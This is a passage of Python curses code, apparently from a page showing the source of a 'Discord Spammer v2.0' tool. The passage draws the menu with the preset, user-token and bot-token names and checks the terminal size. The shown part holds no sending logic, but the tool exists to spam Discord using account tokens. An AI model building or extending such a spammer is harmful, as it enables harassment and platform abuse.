stdscr.addstr(0, 0, "Current Preset: \""+settings["presets"][settings["default_preset"]]["name"]+"\"")<br>        stdscr.addstr(11, 0, "Discord Spammer v2.0 - guns.lol/orangypea <3")<br>        stdscr.addstr(13, 0, "Current User Token: \""+settings["token"]["name"]+"\"")<br>        stdscr.addstr(14, 0, "Current Bot Token: \""+settings["bot_token"]["name"]+"\"")<br>        stdscr.refresh()<br>        opt = choice(curmenu, 0, menu, opt)<br>        doAction(opt)<br><br>ymax, xmax = stdscr.getmaxyx()<br>if (ymax <= 14 or xmax <= 70):<br>    curses.nocbreak()<br>    stdscr.keypad(False)<br>    curses.echo()<br>    curses.endwin()<br>    print("Terminal screen too small! (below or equal to 14 columns/below or equal to 70 rows)")<br>    sys.exit(1)<br>else:<br>    main(stdscr)<br>curses.nocbreak()<br>stdscr.keypad(False)<br>curses.echo()<br>curses.endwin()<br>
  </pre>
</body>
</html>
